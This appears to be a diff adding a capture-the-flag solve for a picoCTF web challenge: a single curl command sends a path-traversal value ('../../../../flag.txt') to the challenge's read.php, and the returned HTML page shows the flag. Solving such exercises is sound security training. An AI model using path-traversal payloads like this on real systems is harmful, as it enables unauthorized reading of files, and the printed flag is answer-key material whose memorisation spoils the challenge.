@@ -1,0 +1,14 @@
+$ curl http://saturn.picoctf.net:53864/read.php --data "filename=../../../../flag.txt"
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="style.css">
+    <title>Web eReader</title>
+  </head>
+  <body>
+
+    picoCTF{7h3_p47h_70_5ucc355_6db46514}<br>  </body>
+</html>
